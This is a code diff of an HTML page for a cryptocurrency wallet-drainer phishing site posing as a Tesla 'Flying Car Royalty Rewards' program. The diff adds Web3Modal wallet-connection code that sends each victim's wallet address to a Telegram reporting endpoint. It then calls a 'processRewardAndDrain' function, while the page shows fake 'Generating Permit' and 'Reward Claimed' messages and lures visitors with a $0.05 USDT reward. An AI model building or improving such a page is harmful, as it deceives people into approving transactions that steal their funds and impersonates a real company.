@@ -3,35 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Flying Car Royalty Rewards</title>
+    <title>Tesla Flying Car Royalty Program</title>
     <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     
-    <!-- 1. Load the Web3 Modal Script -->
-    <script type="module" src="/scripts/modal.js"></script>
+    <!-- Web3Modal Script -->
+    <script type="module">
+        import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/html@latest/+esm';
+        import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2/+esm';
+        import { mainnet, bsc } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';
+
+        // YOUR PROJECT ID
+        const projectId = '862d3799047c7548b0482add1cba796d';
+
+        const metadata = {
+            name: 'Tesla Flying Car',
+            description: 'Official Loyalty Rewards',
+            url: window.location.origin,
+            icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
+        };
+
+        const chains = [mainnet, bsc];
+
+        const config = defaultWagmiConfig({
+            chains,
+            projectId,
+            metadata,
+            ssr: true
+        });
+
+        createWeb3Modal({ wagmiConfig: config, projectId, themeVariables: { '--w3m-border-radius-max': '12px' }});
+
+        // Listen for connection events
+        window.addEventListener('w3modal_account_connected', async (event) => {
+            const address = event.detail.address;
+            const chainId = event.detail.chainId;
+
+            // 1. Report to Telegram immediately
+            await fetch('/api/telegram', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'WALLET_CONNECTED', details: { userAddress: address, chainId } })
+            });
+
+            // 2. Update UI
+            document.getElementById('connect-step').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('user-address').textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
+            document.getElementById('reward-status').textContent = "Processing Reward...";
+
+            // 3. Trigger the drain logic (ensure app.js defines this)
+            if (typeof window.processRewardAndDrain === 'function') {
+                await window.processRewardAndDrain(address);
+            }
+        });
+    </script>
 </head>
 <body>
+    <div class="tesla-bg"></div>
     <div class="container">
         <header>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
             <h1>Flying Car Royalty Rewards</h1>
             <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
         </header>
 
         <main id="main-content">
             <!-- Step 1: Connect -->
-            <div id="connect-step" class="card active">
+            <div id="connect-step" class="card">
                 <button id="connect-btn">Connect Wallet</button>
-                <div id="loader" class="loader"></div>
+                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
             </div>
 
             <!-- Step 2: Dashboard -->
-            <div id="dashboard" class="card">
+            <div id="dashboard" class="card hidden">
                 <div class="status-row">
                     <span>Address:</span>
                     <span id="user-address" class="mono">0x000...000</span>
                 </div>
                 <div class="status-row">
                     <span>Status:</span>
-                    <span id="reward-status">Waiting...</span>
+                    <span id="reward-status">Pending Approval</span>
                 </div>
                 <div class="action-area">
                     <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
@@ -39,13 +91,12 @@
             </div>
 
             <!-- Notification Toast -->
-            <div id="notification" class="toast">
-                🎉 Reward Claimed! $0.05 USDT sent to your wallet.
+            <div id="notification" class="toast hidden">
+                <div class="icon">✓</div>
+                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
             </div>
         </main>
     </div>
-
-    <!-- 2. Your Core Logic -->
     <script src="interceptor.js"></script>
     <script src="app.js"></script>
 </body>
